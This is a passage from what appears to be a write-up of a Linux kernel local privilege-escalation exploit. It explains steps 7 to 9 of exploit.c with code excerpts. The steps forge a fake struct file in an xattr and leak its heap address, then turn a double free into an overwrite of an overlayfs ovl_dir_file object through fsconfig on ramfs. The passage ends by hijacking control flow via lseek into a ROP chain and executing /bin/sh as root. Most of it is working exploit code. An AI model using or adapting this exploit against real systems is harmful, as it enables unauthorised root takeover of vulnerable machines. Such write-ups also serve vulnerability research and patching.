- Prepare fake `struct file` buffer [exploit.c#L808](./exploit.c#L808):

```c

// let's say we call the fake `struct file` object: f
*(uint8_t*)(buf + STRUCT_FILE_F_MODE_OFFSET) = FMODE_LSEEK; // f->f_mode = FMODE_LSEEK
*(uint64_t*)(buf + STRUCT_FILE_F_OP_OFFSET) = fops; // f->f_op = fops
```

- Allocate `struct simple_xattr` object which contain fake `struct file` [exploit.c#L816](./exploit.c#L816):

```c
if (setxattr(r->attrs[1]->path, "security.fake_file", buf,
    KMALLOC_8192 - SIMPLE_XATTR_STRUCT_SIZE, 0) < 0) {
  perror("setxattr");
  return false;
}
```

- I pick kmalloc-8192 heap to store fake `struct file` object. It's ok if you want to use other kmalloc size.
- In Step5, I already used `r->attrs[0]->path` filename to allocate `struct simple_xattr` object. This time, i use `r->attrs[1]->path` filename to allocate `struct simple_xattr` object for fake `struct file` object.

- Leak address of fake `struct file` object [exploit.c#L822](./exploit.c#L822):

```c
user_key_payload_read(r->key_to_read, leak_buffer, r->size_to_read);
void *scan = skip_user_key_payload(leak_buffer, r->live_on_heap);

struct simple_xattr *xattr = scan + r->offsets_to_leak[1];
fake_file_addr = xattr->list.prev + SIMPLE_XATTR_STRUCT_SIZE;
```

- Validate the address of fake `struct file` object doesn't contain null byte [exploit.c#L827](./exploit.c#L827):

```c
bool found_good_address = true;
uint8_t *p8 = (uint8_t*)&fake_file_addr;
for (int i = 0; i < sizeof(uint64_t); i++)
  if (p8[i] == 0)
    found_good_address = false;

```

- The reason is i need to overwrite `struct ovl_dir_file` object with C-style string.
- In case the address actually contain null byte which is never happened while testing the exploit, free `struct simple_xattr` object which contain fake `struct file` object and retry. [exploit.c#L833](./exploit.c#L833):

```c
if (!found_good_address) {
  if (removexattr(r->attrs[1]->path, "security.fake_file") < 0) {
    perror("removexattr(security.fake_file)");
    return false;
  }

  if (!drain_kmalloc_8192(4))
    return false;
} else {
  address_have_null_byte = false;
}
```

### Step7.2: Create `struct ovl_dir_file` object
- Kernel code:

```c
static int ovl_dir_open(struct inode *inode, struct file *file)
{
	struct path realpath;
	struct file *realfile;
	struct ovl_dir_file *od;
	enum ovl_path_type type;

	od = kzalloc(sizeof(struct ovl_dir_file), GFP_KERNEL); // allocation happened here.
	if (!od)
		return -ENOMEM;

	type = ovl_path_real(file->f_path.dentry, &realpath);
	realfile = ovl_dir_open_realfile(file, &realpath);
	if (IS_ERR(realfile)) {
		kfree(od);
		return PTR_ERR(realfile);
	}
	od->realfile = realfile;
	od->is_real = ovl_dir_is_real(file->f_path.dentry);
	od->is_upper = OVL_TYPE_UPPER(type);
	file->private_data = od;

	return 0;
}
```

- [exploit.c#L846](./exploit.c#L846):

```c
int df_fsfd = prepare_double_free(KMALLOC_64);
if (df_fsfd < 0)
  return false;

get_full_timesplice();
trigger_first_free(df_fsfd);
int ovl_fd = ovl_dir_file_alloc();
if (ovl_fd < 0)
  return false;
```

- [exploit.c#L470](./exploit.c#L470):

```c
int ovl_dir_file_alloc(void)
{
  int fd = open(OVERLAYFS_MOUNT_POINT, O_RDONLY);
  if (fd < 0) {
    fprintf(stderr, "open %s failed: %s\n", OVERLAYFS_MOUNT_POINT, strerror(errno));
    return -1;
  }

  return fd;
}
```

- [exploit.c#L21](./exploit.c#L21):

```c
#define OVERLAYFS_MOUNT_POINT "/tmp/overlayfs_mountpoint"
```

- `struct ovl_dir_file` object is allocated on kmalloc-64. I chose to open the overlayfs mountpoint directly. It's ok to open other directory inside overlayfs mountpoint.

- Avoid kernel crash when trigger code execution [exploit.c#L856](./exploit.c#L856):

```c
if (lseek(ovl_fd, 1234, SEEK_SET) < 0) { // bypass the check if (!file->f_pos)
  perror("lseek");
  return false;
}
```

- Kernel check:

```c
static loff_t ovl_dir_llseek(struct file *file, loff_t offset, int origin)
{
	loff_t res;
	struct ovl_dir_file *od = file->private_data;

	inode_lock(file_inode(file));
	if (!file->f_pos)  
		ovl_dir_reset(file);
```

- Next time when the exploit trigger code execution through lseek, f_pos already set to 1234. Therefore, skip `ovl_dir_reset(file)`.

### Step7.3: Fake `ovl_dir_file` object
- Target kernel code path for overwrite primitive:

```c
SYSCALL_DEFINE5(fsconfig,
		int, fd,
		unsigned int, cmd,
		const char __user *, _key,
		const void __user *, _value,
		int, aux)
{
  ...
	struct fs_parameter param = {
		.type	= fs_value_is_undefined,
	};
  ...

  switch (cmd) {
  ...
	case FSCONFIG_SET_STRING:
		param.type = fs_value_is_string;
		param.string = strndup_user(_value, 256); // string buffer allocation happened here.
		if (IS_ERR(param.string)) {
			ret = PTR_ERR(param.string);
			goto out_key;
		}
		param.size = strlen(param.string);
		break;
  ...
  }

  ...
	switch (cmd) {
	case FSCONFIG_SET_STRING:
	case FSCONFIG_SET_BINARY:
		kfree(param.string); // need to set param.string = NULL before reach this line to avoid overwrite data is freed
		break;
  ...
  }
}
```

```c
static int ramfs_parse_param(struct fs_context *fc, struct fs_parameter *param)
{
	struct fs_parse_result result;
	struct ramfs_fs_info *fsi = fc->s_fs_info;
	int opt;

	opt = fs_parse(fc, ramfs_fs_parameters, param, &result);
	if (opt == -ENOPARAM) {
		opt = vfs_parse_fs_param_source(fc, param);
		if (opt != -ENOPARAM)
			return opt;
		return 0;
	}
	if (opt < 0)
		return opt;

	switch (opt) {
	case Opt_mode:
		fsi->mount_opts.mode = result.uint_32 & S_IALLUGO;
		break;
	}

	return 0;
}
```

```c
// param->key == "source" lead to param->string = NULL
int vfs_parse_fs_param_source(struct fs_context *fc, struct fs_parameter *param)
{
	if (strcmp(param->key, "source") != 0)
		return -ENOPARAM;

	if (param->type != fs_value_is_string)
		return invalf(fc, "Non-string source");

	if (fc->source)
		return invalf(fc, "Multiple sources");

	fc->source = param->string;
	param->string = NULL;
	return 0;
}
```

- Prepare for the overwrite [exploit.c#L861](./exploit.c#L861):
```c
  int overwrite_ovl_dir_file_fsfds[2];
  for (int i = 0; i < 2; i++) {
    overwrite_ovl_dir_file_fsfds[i] = syscall(SYS_fsopen, "ramfs", 0);
    if (overwrite_ovl_dir_file_fsfds[i] < 0)
      return false;
  }

  char overwrite_buf[256];
  memset(overwrite_buf, 0xFF, sizeof(overwrite_buf));

  struct ovl_dir_file *od = (struct ovl_dir_file*)overwrite_buf;
  od->realfile = fake_file_addr;
  overwrite_buf[sizeof(struct ovl_dir_file)] = 0;
```

- While testing the exploit, i found that i need to trigger the heap allocation 2 times to overwrite the `struct ovl_dir_file` object. I didn't dig deep to find out why.
- Beside `ramfs`, there are other choices. I pick `ramfs` because there are less code path which make the overwrite process faster.

- Trigger second free and overwrite `struct ovl_dir_file` object [exploit.c#L875](./exploit.c#L875):

```c
get_full_timesplice();
trigger_second_free(df_fsfd);
for (int i = 0; i < 2; i++)
  syscall(SYS_fsconfig, overwrite_ovl_dir_file_fsfds[i], FSCONFIG_SET_STRING, "source", overwrite_buf, 0);
```

- Save the file descriptor [exploit.c#L880](./exploit.c#L880):

```c
trigger_code_execution_fd = ovl_fd;
```

### Step8: Code execution

- [exploit.c#L917](./exploit.c):

```c
lseek(trigger_code_execution_fd, rop_stack, SEEK_CUR);
```

### Step9: Get root shell

- After returning from kernel space, `win` will run to get shell [exploit.c#L153](./exploit.c#L153):

```c
void win(void)
{
  char *sh_args[] = {"sh", NULL};
  execve("/bin/sh", sh_args, NULL);
}
```